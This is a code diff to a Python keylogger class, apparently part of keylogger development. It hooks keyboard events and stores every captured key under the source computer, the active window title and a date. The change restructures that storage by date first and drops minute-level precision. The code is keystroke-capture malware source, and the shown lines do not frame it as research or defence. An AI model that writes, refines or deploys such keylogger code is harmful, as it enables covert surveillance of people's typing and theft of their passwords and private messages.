@@ -19,12 +19,12 @@ class KeyloggerService:
             current_time = self.getTime(event)
             activeWindow = self.getWindowName()
 
-            if activeWindow not in self.data[self.source_computer]:
-                self.data[self.source_computer][activeWindow] = {}
-            if current_time not in self.data[self.source_computer][activeWindow]:
-                self.data[self.source_computer][activeWindow][current_time] = ""
+            if current_time not in self.data[self.source_computer]:
+                self.data[self.source_computer][current_time] = {}
+            if activeWindow not in self.data[self.source_computer][current_time]:
+                self.data[self.source_computer][current_time][activeWindow] = ""
 
-            self.data[self.source_computer][activeWindow][current_time] += event_name
+            self.data[self.source_computer][current_time][activeWindow] += event_name
 
         keyboard.on_release(callback)
 
@@ -51,8 +51,8 @@ class KeyloggerService:
         return pw.getActiveWindowTitle() or "Unknown Window"
 
     def getTime(self, event):
-        return datetime.fromtimestamp(event.time).strftime("%Y-%m-%d %H:%M")
-
+        #return datetime.fromtimestamp(event.time).strftime("%Y-%m-%d %H:%M")
+        return datetime.fromtimestamp(event.time).strftime("%Y-%m-%d")
 
     def get_collected_data(self):
         return self.data
